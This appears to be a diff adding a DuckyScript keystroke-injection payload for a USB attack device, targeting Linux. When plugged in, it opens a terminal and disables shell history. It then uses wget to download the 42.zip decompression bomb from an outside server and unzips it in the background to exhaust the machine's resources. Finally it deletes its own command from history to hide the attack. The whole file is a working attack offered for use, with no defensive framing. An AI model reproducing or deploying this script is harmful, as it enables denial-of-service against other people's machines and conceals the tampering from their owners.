@@ -1,0 +1,39 @@
+REM FalsePhilosopher
+REM zipbomb i found and thought I would have some fun with
+REM Target linux
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 1500
+REM cover tracks for sneak +1
+STRING set +o history
+DELAY 300
+ENTER
+REM FIRE IN THE HOLE!
+STRING nohup wget https://www.lostserver.com/static/42.zip >/dev/null  &&  unzip 42.zip >/dev/null &
+DELAY 300
+ENTER
+DELAY 1500
+CTRL C
+DELAY 300
+CTRL C
+REM i'm sure there's a better way to do that.
+DELAY 300
+REM sneakyboi
+STRING history | grep history
+DELAY 200
+ENTER
+STRING line=$(history | grep history | awk '{ print $1 }')
+DELAY 200
+ENTER
+STRING history -d $line
+DELAY 200
+ENTER
+DELAY 200
+STRING set -o history && exit
+DELAY 200
+ENTER
+DELAY 300
+REM insert capslock flashing code here if not using a flipper or other debugger.
